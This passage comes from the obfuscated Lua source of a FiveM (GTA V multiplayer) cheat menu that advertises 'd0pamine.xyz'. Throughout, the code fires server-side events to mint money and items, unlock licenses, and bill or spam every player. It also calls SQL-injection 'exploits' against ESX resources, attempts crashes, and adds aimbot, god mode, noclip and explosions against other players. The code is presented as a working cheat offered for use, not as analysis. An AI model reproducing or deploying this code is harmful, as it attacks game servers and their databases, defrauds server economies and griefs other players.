                    if Macias.MenuButton(jc, "vehicleSpawnSelectedOptions") then
                        selectedCarToSpawn = Rf4TU
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("vehicleSpawnSelectedOptions") then
                if Macias.Button("Spawn Car") then
                    MaciasFunc.spawnVehicle(hm5xuURWI8CQXvc5eGxI[selectedCarTypeIdx][selectedCarToSpawn])
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("serverOptionsTriggerEvents") then
                if Macias.MenuButton("ESX Triggers", "serverOptionsTriggerEventsESX") then
                elseif Macias.MenuButton("vRP Triggers", "serverOptionsTriggerEventsVRP") then
                elseif Macias.Button("Spam Chat", "Server") then
                    for colorLoop = 2, 6 do
                        TriggerMaciasEvent(
                            true,
                            "_chat:messageEntered",
                            "d0pamine.xyz",
                            {YKyAw.r, YKyAw.g, YKyAw.b},
                            "^" .. colorLoop .. " d0pamine.xyz | discord.gg/fjBp55t"
                        )
                        TriggerMaciasEvent(
                            true,
                            "_chat:messageEntered",
                            "d0pamine.xyz",
                            {YKyAw.r, YKyAw.g, YKyAw.b},
                            "/ooc ^" .. colorLoop .. " d0pamine.xyz | discord.gg/fjBp55t"
                        )
                    end
                elseif Macias.Button("InteractSound Earrape", "Server") then
                    MaciasFunc.exploits.interactSound()
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("serverOptionsTriggerEventsESX") then
                if Macias.MenuButton("Money & Item Options", "serverOptionsTriggerEventsESXMoney") then
                elseif Macias.Button("Skin Changer", "Client") then
                    if MaciasFunc.doesResourceExist("esx_skin") then
                        Macias.CloseMenu()
                        TriggerMaciasEvent(
                            false,
                            "esx_skin:openRestrictedMenu",
                            function(XRqLhnZu039hu6U, yUiusezoTGlq9VdEqW8Cg)
                            end
                        )
                    else
                        Macias.PushNotification("Resource was not found!", 5000)
                    end
                elseif Macias.Button("Unrestrain Handcuffs", "Client") then
                    if MaciasFunc.doesResourceExist("esx_policejob") then
                        TriggerMaciasEvent(false, "esx_policejob:unrestrain")
                    else
                        Macias.PushNotification("Resource was not found!", 5000)
                    end
                elseif Macias.Button("Full Hunger", "Client") then
                    if MaciasFunc.doesResourceExist("esx_status") then
                        TriggerMaciasEvent(false, "esx_status:set", "hunger", 1000000)
                    else
                        Macias.PushNotification("Resource was not found!", 5000)
                    end
                elseif Macias.Button("Full Thirst", "Client") then
                    if MaciasFunc.doesResourceExist("esx_status") then
                        TriggerMaciasEvent(false, "esx_status:set", "thirst", 1000000)
                    else
                        Macias.PushNotification("Resource was not found!", 5000)
                    end
                elseif Macias.Button("Tuner Chip", "Client") then
                    if
                        MaciasFunc.doesResourceExist("tunerchip") or MaciasFunc.doesResourceExist("tunerlaptop") or
                            MaciasFunc.doesResourceExist("xgc-tuner") or
                            MaciasFunc.doesResourceExist("tuninglaptop")
                     then
                        TriggerMaciasEvent(false, "xgc-tuner:openTuner")
                        TriggerMaciasEvent(false, "tuning:useLaptop")
                    else
                        Macias.PushNotification("Resource was not found!", 5000)
                    end
                elseif Macias.Button("Spawn Owned Vehicle", "Server") then
                    local cOFxD00346hyXWlRCrGv = KeyboardInputMacias("Enter Vehicle Spawn Name", " ", 10)
                    local M8dijU9EXDD = KeyboardInputMacias("Enter Vehicle Plate Number", " ", 8)
                    MaciasFunc.sPO.SpawnLegalVehicle(cOFxD00346hyXWlRCrGv, PlayerId(), M8dijU9EXDD)
                elseif Macias.Button("Sell Owned Vehicle", "Server") then
                    MaciasFunc.sPO.ESXSellVehicle()
                elseif Macias.Button("Get All Licenses", "Server") then
                    MaciasFunc.exploits.esx_givelicenses()
                elseif Macias.Button("GCPhone Earrape", "Server") then
                    MaciasFunc.exploits.gcphoneTwitter()
                elseif Macias.Button("Licenses SQL Exploit", "Server") then
                    MaciasFunc.exploits.esx_license()
                elseif Macias.Button("Kashacters SQL Exploit", "Server") then
                    MaciasFunc.exploits.esx_kashacters()
                elseif Macias.Button("Police Alert Spam", "Server") then
                    MaciasFunc.exploits.esx_outlawalert()
                elseif Macias.Button("Bill Everyone", "Server") then
                    MaciasFunc.exploits.esx_billing()
                elseif Macias.Button("Phone Jobs Spam", "Server") then
                    MaciasFunc.exploits.phoneSpam()
                elseif
                    Macias.ComboBox(
                        "Open Boss Menu ~r~(!)",
                        boss_menu_words,
                        boss_menu_current,
                        boss_menu_selected,
                        function(currentIndex, selectedIndex)
                            boss_menu_current = currentIndex
                            boss_menu_selected = currentIndex
                        end
                    )
                 then
                    TriggerMaciasEvent(
                        false,
                        "esx_society:openBossMenu",
                        string.lower(boss_menu_words[boss_menu_selected]),
                        function(a, b)
                            b.close()
                        end
                    )
                    Macias.CloseMenu()
                    print(string.lower(boss_menu_words[boss_menu_selected]))
                elseif Macias.Button("Spam Server Console", "Server") then
                    MaciasFunc.exploits.esx_spam_server_console()
                elseif Macias.Button("Police Job Crash Attempt ~r~(!)", "Server") then
                    MaciasFunc.exploits.esx_policejob_crash()
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("serverOptionsTriggerEventsESXMoney") then
                if
                    Macias.ComboBox(
                        "Harvest Items ~r~(!)",
                        {"Weed", "Opium", "Meth", "Coke", "Gaz Bottle", "Fix Tool", "Caro Tool"},
                        stjV43u5,
                        Tx70s70,
                        function(PMnfGcvrOXJtb, Ya0uGL9LlgeB9O)
                            stjV43u5 = PMnfGcvrOXJtb
                            Tx70s70 = PMnfGcvrOXJtb
                        end
                    )
                 then
                    MaciasFunc.exploits.esx_harvestitems()
                elseif
                    Macias.ComboBox(
                        "Generate Job Paycheck ~r~(!)",
                        Jobs.Money,
                        oGaAOvW0nQhY3,
                        s_NpohOYBIXnoFgWoduc,
                        function(UNhssYH, V4Ls8v)
                            oGaAOvW0nQhY3 = UNhssYH
                            s_NpohOYBIXnoFgWoduc = UNhssYH
                        end
                    )
                 then
                    local Igv = KeyboardInputMacias("Enter the amount of money for paycheck", " ", 10)
                    if Igv ~= " " then
                        TriggerMaciasEvent(true, Jobs.Money.Value[s_NpohOYBIXnoFgWoduc] .. ":pay", tonumber(Igv))
                    end
                elseif
                    Macias.ComboBox(
                        "Spawn Jobs Items ~r~(!)",
                        Jobs.Item,
                        bctUcP7ANFBFC3,
                        Cm98o9wZsaLnySTDWo,
                        function(aOZPecu, _Fsz0SspyGJ)
                            bctUcP7ANFBFC3 = aOZPecu
                            Cm98o9wZsaLnySTDWo = aOZPecu
                        end
                    )
                 then
                    MaciasFunc.exploits.esx_jobitems()
                elseif
                    Macias.ComboBox(
                        "Spawn Custom Items ~r~(!)",
                        CustomItems.Item,
                        VGk9xyYTC7F9E0rO6,
                        VS,
                        function(HpYfXRlv1GFyBdNszZcm8, D9ZuF9Kl4KdlcjD)
                            VGk9xyYTC7F9E0rO6 = HpYfXRlv1GFyBdNszZcm8
                            VS = HpYfXRlv1GFyBdNszZcm8
                        end
                    )
                 then
                    MaciasFunc.exploits.esx_spawncustomitems()
                elseif Macias.Button("Spawn A Custom Item ~r~(!)", "Server") then
                    MaciasFunc.exploits.esx_spawncustomitem()
                elseif Macias.Button("Stop Harvesting ~r~(!)", "Server") then
                    MaciasFunc.exploits.esx_harvest_stop()
                elseif Macias.Button("Wash Dirty Money ~r~(!)", "Server") then
                    MaciasFunc.exploits.esx_moneywash()
                elseif Macias.Button("Moneymaker ~r~(!)", "Server") then
                    MaciasFunc.exploits.esx_moneymaker()
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("serverOptionsTriggerEventsVRP") then
                if Macias.Button("Toggle Handcuffs", "Client") then
                    vRP.toggleHandcuff()
                elseif Macias.Button("Clear Wanted Level", "Client") then
                    vRP.applyWantedLevel(0)
                elseif Macias.Button("Trucker Job Money", "Client") then
                    local wWFK0W = KeyboardInputMacias("Enter $ Amount:", " ", 12)
                    if wWFK0W ~= " " then
                        local XG9_YTQebPjIw1 = wWFK0W / 3.8
                        vRPtruckS = Tuunnell.getInterface("vRP_trucker", "vRP_trucker")
                        vRPtruckS.finishTruckingDelivery({XG9_YTQebPjIw1})
                    end
                elseif Macias.Button("Casino Chips", "Client") then
                    local eS22bs = KeyboardInputMacias("Enter Chips Amount:", " ", 12)
                    if eS22bs ~= " " then
                        vRPcasinoS = Tuunnell.getInterface("vRP_casino", "vRP_casino")
                        vRPcasinoS.payRouletteWinnings({eS22bs, 2})
                    end
                elseif Macias.Button("Chests Money", "Server") then
                    TriggerMaciasEvent(true, "basic")
                    TriggerMaciasEvent(true, "silver")
                    TriggerMaciasEvent(true, "legendary")
                elseif Macias.Button("Los Santos Customs", "Server") then
                    local RqPpaEgmMgqnHCfRUgO = KeyboardInputMacias("Enter amount of money", " ", 12)
                    if RqPpaEgmMgqnHCfRUgO ~= " " then
                        TriggerMaciasEvent(true, "lscustoms:payGarage", {costs = -RqPpaEgmMgqnHCfRUgO})
                    end
                elseif Macias.Button("Slot Machine", "Server") then
                    local e0rFlmwZ1PfQ = KeyboardInputMacias("Enter amount of money", " ", 12)
                    if e0rFlmwZ1PfQ ~= " " then
                        TriggerMaciasEvent(true, "vrp_slotmachine:server:2", e0rFlmwZ1PfQ)
                    end
                elseif Macias.Button("Legacy Fuel", "Server") then
                    local fshn = KeyboardInputMacias("Enter amount of money", " ", 12)
                    if fshn ~= " " then
                        TriggerMaciasEvent(true, "LegacyFuel:PayFuel", {costs = -fshn})
                    end
                elseif Macias.Button("Get Driving License", "Server") then
                    TriggerMaciasEvent(true, "dmv:success")
                elseif Macias.Button("Bank Deposit", "Server") then
                    local pJKrBq3X9TJG = KeyboardInputMacias("Enter amount of money", " ", 12)
                    if pJKrBq3X9TJG ~= " " then
                        TriggerMaciasEvent(true, "Banca:deposit", pJKrBq3X9TJG)
                        TriggerMaciasEvent(true, "bank:deposit", pJKrBq3X9TJG)
                    end
                elseif Macias.Button("Bank Withdraw", "Server") then
                    local NbWlcRDldDIh = KeyboardInputMacias("Enter amount of money", " ", 12)
                    if NbWlcRDldDIh ~= " " then
                        TriggerMaciasEvent(true, "bank:withdraw", NbWlcRDldDIh)
                        TriggerMaciasEvent(true, "Banca:withdraw", NbWlcRDldDIh)
                    end
                end
                Macias.Display()
            elseif IsDisabledControlJustPressed(0, keyboard_keys[OlGuUvqPdqVORQAfiabSX]) then
                Macias.OpenMenu("dopamine")
            end
            if #cachedNotificationsMacias > 0 then
                for notificationIndex = 1, #cachedNotificationsMacias do
                    local Hsv_w8hh = cachedNotificationsMacias[notificationIndex]
                    if Hsv_w8hh then
                        Hsv_w8hh["opacity"] = (Hsv_w8hh["opacity"] or (Hsv_w8hh["time"] / 1000.0) * 60) - 1
                        local nagq = 0.005 + (notificationIndex * 0.05)
                        local BFC5_Kp1Uf = (GetGameTimer() - Hsv_w8hh["startTime"]) / Hsv_w8hh["time"] * 100.0
                        Macias.Draw3D(0.5, 0.8 * nagq, Hsv_w8hh["text"], Hsv_w8hh["opacity"])
                        if BFC5_Kp1Uf >= 100.0 then
                            Macias.RemoveNotification(notificationIndex)
                        end
                    end
                end
            end
            SetPlayerInvincible(PlayerId(), bxtzJqeTcu8Hfb)
            SetEntityInvincible(PlayerPedId(-1), bxtzJqeTcu8Hfb)
            SetEntityProofs(
                PlayerPedId(),
                bxtzJqeTcu8Hfb,
                bxtzJqeTcu8Hfb,
                bxtzJqeTcu8Hfb,
                bxtzJqeTcu8Hfb,
                bxtzJqeTcu8Hfb
            )
            SetPedCanRagdoll(PlayerPedId(), not d6l2SglzH3nhigdp13h0S)
            if VySplDkfJdL6Pj then
                if GetEntityHealth(PlayerPedId()) < 200 then
                    SetEntityHealth(PlayerPedId(), 200)
                end
            end
            if ywG8rP0koqFJrXLYGEcO then
                ClearPlayerWantedLevel(PlayerId())
            end
            if Avio5D8J42FDB then
                X0H3ct8R5EnRD8fN = true
                SetEntityVisible(PlayerPedId(), 0, 0)
            end
            if not Avio5D8J42FDB and X0H3ct8R5EnRD8fN then
                X0H3ct8R5EnRD8fN = false
                SetEntityVisible(PlayerPedId(), 1, 1)
            end
            if lZ58tWwVdUGud16j63nd then
                ResetPlayerStamina(PlayerId())
            end
            if XYqiiJ9l6pXVPOizE then
                MaciasFunc.noclipAdv()
            end
            if RHjT3hXjNi then
                SetSuperJumpThisFrame(PlayerId())
            end
            if MMCdqxHinL then
                uxJar0V_mxsLlrYT2 = true
                SetPedConfigFlag(PlayerPedId(), 223, true)
            elseif not MMCdqxHinL and uxJar0V_mxsLlrYT2 then
                uxJar0V_mxsLlrYT2 = false
                SetPedConfigFlag(PlayerPedId(), 223, false)
            end
            SetSeethrough(JAi7EkCyHw2ioIQ)
            SetNightvision(nWEHC6n0j4g92)
            if _rgyS5S3Q then
                MaciasFunc.doForceFieldTick(5)
                SetSuperJumpThisFrame(PlayerId())
                SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                SetPedMoveRateOverride(PlayerId(), 10)
                RequestNamedPtfxAsset("core")
                UseParticleFxAssetNextCall("core")
                StartNetworkedParticleFxNonLoopedOnEntity(
                    "ent_sht_electrical_box",
                    PlayerPedId(),
                    0,
                    0,
                    -0.5,
                    0,
                    0,
                    0,
                    1,
                    false,
                    false,
                    false
                )
            end
            if Oz then
                local u_gEjDtHD3n4L7QMA = GetEntityCoords(GetPlayerPed(SjqKFFPQMn0FcwBwiS4mE))
                AddExplosion(u_gEjDtHD3n4L7QMA.x, u_gEjDtHD3n4L7QMA.y, u_gEjDtHD3n4L7QMA.z, 4, 1, 0, 1, 0, 1)
            end
            if Li4EQ77 then
                MaciasFunc.aPO.freezeAll()
            end
            if OaYL3SNOYT then
                MaciasFunc.aPO.disableDrivingCars()
            end
            if bP5N7Wm5Erw then
                MaciasFunc.aPO.noisyVehicles()
            end
            if selectedCustomCrosshair == 2 then
                ShowHudComponentThisFrame(14)
            elseif selectedCustomCrosshair == 3 then
                MaciasFunc.drawTextCrosshairs("+", 0.495, 0.484, 1, 0.3, YKyAw)
            end
            SetArtificialLightsState(H)
            if WfYVJ8MoOy3Hl7 then
                DisplayRadar(true)
            end
            if pedDensityXSelected < 1 then
                SetVehicleDensityMultiplierThisFrame(pedDensityXSelected)
                SetRandomVehicleDensityMultiplierThisFrame(pedDensityXSelected)
                SetParkedVehicleDensityMultiplierThisFrame(pedDensityXSelected)
                SetAmbientVehicleRangeMultiplierThisFrame(1)
                SetPedDensityMultiplierThisFrame(pedDensityXSelected)
                SetScenarioPedDensityMultiplierThisFrame(pedDensityXSelected, pedDensityXSelected)
                DistantCopCarSirens(false)
                SetGarbageTrucks(false)
                SetRandomBoats(false)
                SetCreateRandomCops(false)
                SetCreateRandomCopsNotOnScenarios(false)
                SetCreateRandomCopsOnScenarios(false)
                local tp1ne1t, FHgb6i8HGgWC2m8ytjg8, H_9lA = table.unpack(GetEntityCoords(PlayerPedId()))
                ClearAreaOfVehicles(tp1ne1t, FHgb6i8HGgWC2m8ytjg8, H_9lA, 1000.0, false, false, false, false, false)
                RemoveVehiclesFromGeneratorsInArea(
                    tp1ne1t - 500,
                    FHgb6i8HGgWC2m8ytjg8 - 500,
                    H_9lA - 500,
                    tp1ne1t + 500,
                    FHgb6i8HGgWC2m8ytjg8 + 500,
                    H_9lA + 500
                )
            end
            if AGJfaPksVU > 1 then
                SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), AGJfaPksVU + 0)
            end
            if tWPGzJDB > 1 then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), tWPGzJDB + 1)
            end
            if C8RfqDn and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
            end
            if LAIOcfn3rolnOx1W then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1)) and
                        GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1)), -1) == GetPlayerPed(-1)
                 then
                    SetVehicleWheelieState(GetVehiclePedIsIn(GetPlayerPed(-1)), 129)
                end
            end
            if fmT then
                local Aw5skO = DpYO8(1)
                RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
                SetVehicleCustomPrimaryColour(GetVehiclePedIsIn(PlayerPedId(), 0), Aw5skO.r, Aw5skO.g, Aw5skO.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsIn(PlayerPedId(), 0), Aw5skO.r, Aw5skO.g, Aw5skO.b)
            end
            if rwIrTL9JmO7v then
                local Kb = DpYO8(1)
                RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), Kb.r, Kb.g, Kb.b)
                for i = -1, 12 do
                    SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
                end
            end
            SetPedCanBeKnockedOffVehicle(PlayerPedId(), pr_jxNqpjnLEezH)
            if KzFsC7pbI then
                if (IsPedInVehicle(PlayerPedId(), GetVehiclePedIsIn(PlayerPedId(), true), true)) then
                    ApplyForceToEntity(
                        GetVehiclePedIsIn(PlayerPedId(), true),
                        1,
                        0,
                        0,
                        -0.1,
                        0,
                        0,
                        0,
                        1,
                        false,
                        true,
                        true,
                        true,
                        true
                    )
                end
            end
            if cZ8CKxjM_N1 then
                if (IsPedInVehicle(PlayerPedId(), GetVehiclePedIsIn(PlayerPedId(), true), true)) then
                    ApplyForceToEntity(
                        GetVehiclePedIsIn(PlayerPedId(), true),
                        1,
                        0,
                        0,
                        -0.4,
                        0,
                        0,
                        0,
                        1,
                        true,
                        true,
                        true,
                        true,
                        true
                    )
                end
            end
            if NF3U then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                roundx = tonumber(string.format("%.2f", x))
                roundy = tonumber(string.format("%.2f", y))
                roundz = tonumber(string.format("%.2f", z))
                MaciasFunc.drawTextCrosshairs("~w~X: ~s~" .. roundx, 0.05, 0, YKyAw)
                MaciasFunc.drawTextCrosshairs("~w~Y: ~s~" .. roundy, 0.11, 0, YKyAw)
                MaciasFunc.drawTextCrosshairs("~w~Z: ~s~" .. roundz, 0.17, 0, YKyAw)
            end
            SetPlayerWeaponDamageModifier(PlayerId(), zMMHskuAX7QW9noU)
            SetPlayerMeleeWeaponDamageModifier(PlayerId(), zMMHskuAX7QW9noU)
            if MIPSqLh9aOgDF2JHx then
                local JP_awZeuWK8USwoI, l41HxMdVNfxuq = GetPedLastWeaponImpactCoord(PlayerPedId())
                if JP_awZeuWK8USwoI then
                    AddExplosion(l41HxMdVNfxuq.x, l41HxMdVNfxuq.y, l41HxMdVNfxuq.z, 2, 100000.0, true, false, 0)
                end
                SetExplosiveMeleeThisFrame(PlayerId())
            end
            if jbGHvAqpy then
                local l4nrhQ9ZC, wyABs78x7An = GetPedLastWeaponImpactCoord(PlayerPedId())
                if l4nrhQ9ZC then
                    SetEntityCoords(PlayerPedId(), wyABs78x7An.x, wyABs78x7An.y, wyABs78x7An.z + 3)
                end
            end
            if QwnbTipwbcG then
                MaciasFunc.runAimbot()
            end
            if cAMZ5H60uTxQqSP then
                MaciasFunc.rapidFireTick()
            end
            if IsDisabledControlJustPressed(0, keyboard_keys[qoWbq6ZkwwgrWkguuODDo]) then
                SetEntityHealth(PlayerPedId(-1), 200)
                Macias.PushNotification("Health refilled", 5000)
            end
            if IsDisabledControlJustPressed(0, keyboard_keys[qsnyzNENQPII7EPs]) then
                SetPedArmour(PlayerPedId(-1), 200)
                Macias.PushNotification("Armour refilled", 5000)
            end
            if IsDisabledControlJustPressed(0, keyboard_keys[g5M]) then
                MaciasFunc.toggleNoclip()
            end
            Citizen.Wait(0)
        end
    end
)
Citizen.CreateThread(
    function()
        while NywuctsA4BD4b3_G0 do
            if InqLDivpr6 then
                MaciasFunc.vehicle2Step()
            end
            if ai then
                RequestNamedPtfxAsset("scr_recartheft")
                while not HasNamedPtfxAssetLoaded("scr_recartheft") do
                    Wait(1)
                end
                RequestNamedPtfxAsset("core")
                while not HasNamedPtfxAssetLoaded("core") do
                    Wait(1)
                end
                ang, speed = MaciasFunc.Game.vehicleAngle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
                local bFwfN = 0.25
                local OjMerSM0mUWI9k7LqT4 = 25
                local z7Bowk5Ux7js9jZedorYN = 1.5
                if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                    if speed >= 1 and ang ~= 0 then
                        MaciasFunc.Game.driftSmoke(
                            "scr_recartheft",
                            "scr_wheel_burnout",
                            GetVehiclePedIsUsing(GetPlayerPed(-1)),
                            OjMerSM0mUWI9k7LqT4,
                            bFwfN
                        )
                    elseif IsVehicleInBurnout(GetVehiclePedIsUsing(GetPlayerPed(-1))) then
                        MaciasFunc.Game.driftSmoke(
                            "core",
                            "exp_grd_bzgas_smoke",
                            GetVehiclePedIsUsing(GetPlayerPed(-1)),
                            3,
                            z7Bowk5Ux7js9jZedorYN
                        )
                    end
                end
            end
            if nkZB then
                local i = GetActivePlayers()
                for i = 1, #i do
                    local MDTN9CPCJoNa0sf4q8 = i[i]
                    if GetPlayerPed(MDTN9CPCJoNa0sf4q8) ~= GetPlayerPed(-1) then
                        local bxd9y3piNcgQqA7Kc = GetPlayerPed(MDTN9CPCJoNa0sf4q8)
                        local IW5ielFW2c, fS, JPTccbeAqlVgV7YQKi = table.unpack(GetEntityCoords(PlayerPedId(), true))
                        local leNFyoX3INYdz, AJi_1T0k_I, W7 =
                            table.unpack(GetEntityCoords(GetPlayerPed(MDTN9CPCJoNa0sf4q8), true))
                        local rzYdkHOEmYWzPcgSA =
                            math.round(
                            #(vector3(IW5ielFW2c, fS, JPTccbeAqlVgV7YQKi) - vector3(leNFyoX3INYdz, AJi_1T0k_I, W7)),
                            1
                        )
                        if rzYdkHOEmYWzPcgSA < 125 then
                            if NetworkIsPlayerTalking(MDTN9CPCJoNa0sf4q8) then
                                DrawText3D(
                                    leNFyoX3INYdz,
                                    AJi_1T0k_I,
                                    W7 + 1.25,
                                    " " ..
                                        GetPlayerServerId(MDTN9CPCJoNa0sf4q8) ..
                                            " | " .. GetPlayerName(MDTN9CPCJoNa0sf4q8) .. " ",
                                    30,
                                    144,
                                    255
                                )
                            else
                                DrawText3D(
                                    leNFyoX3INYdz,
                                    AJi_1T0k_I,
                                    W7 + 1.25,
                                    " " ..
                                        GetPlayerServerId(MDTN9CPCJoNa0sf4q8) ..
                                            " | " .. GetPlayerName(MDTN9CPCJoNa0sf4q8) .. " ",
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                    end
                end
            end
            Citizen.Wait(0)
        end
    end
)
MaciasFunc = {}
MaciasFunc.doesResourceExist = function(Y3azK)
    if
        GetResourceState(Y3azK) == "started" or string.upper(GetResourceState(Y3azK)) == "started" or
            string.lower(GetResourceState(Y3azK)) == "started"
     then
        return true
    else
        return false
    end
end
MaciasFunc.drawTextCrosshairs = function(_Jvt13x6Un9RPE, nPIyrvZsPssLdH2IN, g3IXCgquUds95a)
    SetTextColour(YKyAw.r, YKyAw.g, YKyAw.b, 255)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0, 0.4)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(_Jvt13x6Un9RPE)
    DrawText(nPIyrvZsPssLdH2IN, g3IXCgquUds95a)
end
MaciasFunc.teleportToWaypoint = function()
    Citizen.CreateThread(
        function()
            local m1MNr = PlayerPedId()
            if IsPedInAnyVehicle(m1MNr, false) then
                m1MNr = GetVehiclePedIsUsing(m1MNr)
            end
            local xkC0xljEAUY602Sib6hU = false
            local vXNIndBd4Gx5 = false
            local F09dm = GetBlipInfoIdIterator()
            local qdCOSzd4YQWGx28qgYXap = GetFirstBlipInfoId(8)
            while DoesBlipExist(qdCOSzd4YQWGx28qgYXap) do
                if GetBlipInfoIdType(qdCOSzd4YQWGx28qgYXap) == 4 then
                    cx, cy, cz =
                        table.unpack(
                        GetBlipInfoIdCoord(
                            qdCOSzd4YQWGx28qgYXap,
                            Citizen.ReturnResultAnyway(),
                            Citizen.ResultAsVector()
                        )
                    )
                    vXNIndBd4Gx5 = true
                    break
                end
                qdCOSzd4YQWGx28qgYXap = GetNextBlipInfoId(F09dm)
                Wait(0)
            end
            if vXNIndBd4Gx5 then
                local tu4ttufSq29GK = false
                local DmjLF2Bbe3FZoZ6xoO = GetEntityHeading(m1MNr)
                for i = 0, 1000.0, 1 do
                    SetEntityCoordsNoOffset(m1MNr, cx, cy, ToFloat(i), false, false, false)
                    SetEntityRotation(m1MNr, 0, 0, 0, 0, 0)
                    SetEntityHeading(m1MNr, DmjLF2Bbe3FZoZ6xoO)
                    SetGameplayCamRelativeHeading(0)
                    Wait(0)
                    if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then
                        cz = ToFloat(i)
                        tu4ttufSq29GK = true
                        break
                    end
                end
                if not tu4ttufSq29GK then
                    cz = -300
                end
                xkC0xljEAUY602Sib6hU = true
            end
            if xkC0xljEAUY602Sib6hU then
                SetEntityCoordsNoOffset(m1MNr, cx, cy, cz, false, false, true)
                SetGameplayCamRelativeHeading(0)
                if IsPedSittingInAnyVehicle(PlayerPedId()) then
                    if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
                        SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
                    end
                end
            end
        end
    )
end
MaciasFunc.runParticle = function()
    RequestNamedPtfxAsset("proj_xmas_firework")
    UseParticleFxAssetNextCall("proj_xmas_firework")
    StartNetworkedParticleFxNonLoopedOnEntity(
        "scr_firework_xmas_burst_rgw",
        PlayerPedId(),
        0,
        0,
        -0.5,
        0,
        0,
        0,
        1,
        false,
        false,
        false
    )
end
MaciasFunc.runInjectParticle = function()
    RequestNamedPtfxAsset("proj_xmas_firework")
    UseParticleFxAssetNextCall("proj_xmas_firework")
    StartNetworkedParticleFxNonLoopedOnEntity(
        "scr_firework_xmas_burst_rgw",
        PlayerPedId(),
        0,
        0,
        -0.5,
        0,
        0,
        0,
        1,
        false,
        false,
        false
    )
    StartNetworkedParticleFxNonLoopedOnEntity(
        "scr_firework_xmas_spiral_burst_rgw",
        PlayerPedId(),
        0,
        0,
        -0.5,
        0,
        0,
        0,
        1,
        false,
        false,
        false
    )
    StartNetworkedParticleFxNonLoopedOnEntity(
        "scr_xmas_firework_sparkle_spawn",
        PlayerPedId(),
        0,
        0,
        -0.5,
        0,
        0,
        0,
        1,
        false,
        false,
        false
    )
end
MaciasFunc.respawnPed = function(i8CKVc, wPHjsIoyC9, iCQfY4n)
    SetEntityCoordsNoOffset(i8CKVc, wPHjsIoyC9.x, wPHjsIoyC9.y, wPHjsIoyC9.z, false, false, false, true)
    NetworkResurrectLocalPlayer(wPHjsIoyC9.x, wPHjsIoyC9.y, wPHjsIoyC9.z, iCQfY4n, true, false)
    SetPlayerInvincible(i8CKVc, false)
    TriggerMaciasEvent(false, "playerSpawned", wPHjsIoyC9.x, wPHjsIoyC9.y, wPHjsIoyC9.z)
    ClearPedBloodDamage(i8CKVc)
end
MaciasFunc.nativeRevive = function()
    local zLXwr6t9ybAtDp = GetEntityCoords(PlayerPedId())
    local sKquZDsjk7h0GINR = {
        x = MaciasFunc.Math.Round(zLXwr6t9ybAtDp.x, 1),
        y = MaciasFunc.Math.Round(zLXwr6t9ybAtDp.y, 1),
        z = MaciasFunc.Math.Round(zLXwr6t9ybAtDp.z, 1)
    }
    MaciasFunc.respawnPed(PlayerPedId(), sKquZDsjk7h0GINR, 0)
    StopScreenEffect("DeathFailOut")
    Macias.PushNotification("Revived", 5000)
end
MaciasFunc.repairVehicle = function(ZKAZjjQlLHiV81xIBZP)
    SetVehicleEngineHealth(ZKAZjjQlLHiV81xIBZP, 1000.0)
    SetVehicleFixed(ZKAZjjQlLHiV81xIBZP)
    SetVehicleEngineOn(ZKAZjjQlLHiV81xIBZP, 1, 1)
    SetVehicleBurnout(ZKAZjjQlLHiV81xIBZP, false)
end
MaciasFunc.deleteVehicle = function(HRLI2QnXvljz, N5tbCOAx47DfQI7d)
    Citizen.CreateThread(
        function()
            if N5tbCOAx47DfQI7d then
                local DQZNtQ5FVV86q = PlayerPedId()
                N5tbCOAx47DfQI7d = tonumber(N5tbCOAx47DfQI7d) + 0.01
                local FpYjZZo7eEbR =
                    MaciasFunc.Game.GetVehiclesInArea(GetEntityCoords(DQZNtQ5FVV86q), N5tbCOAx47DfQI7d)
                for HgwhP, HqUT2 in ipairs(FpYjZZo7eEbR) do
                    local ty = 0
                    while not NetworkHasControlOfEntity(HqUT2) and ty < 50 and DoesEntityExist(HqUT2) do
                        NetworkRequestControlOfEntity(HqUT2)
                        ty = ty + 1
                    end
                    if DoesEntityExist(HqUT2) and NetworkHasControlOfEntity(HqUT2) then
                        SetEntityAsMissionEntity(HqUT2, false, true)
                        DeleteVehicle(HqUT2)
                    end
                end
            else
                SetEntityAsMissionEntity(HRLI2QnXvljz, false, true)
                DeleteVehicle(HRLI2QnXvljz)
            end
        end
    )
end
MaciasFunc.optimizeFPS = function()
    ClearAllBrokenGlass()
    ClearAllHelpMessages()
    LeaderboardsReadClearAll()
    ClearBrief()
    ClearGpsFlags()
    ClearPrints()
    ClearSmallPrints()
    ClearReplayStats()
    LeaderboardsClearCacheData()
    ClearFocus()
    ClearHdArea()
    ClearPedBloodDamage(PlayerPedId())
    ClearPedWetness(PlayerPedId())
    ClearPedEnvDirt(PlayerPedId())
    ResetPedVisibleDamage(PlayerPedId())
end
MaciasFunc.disappearFromChase = function()
    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
        local RV2P_zOkzGC5n0VZT = GetVehiclePedIsIn(PlayerPedId(), true)
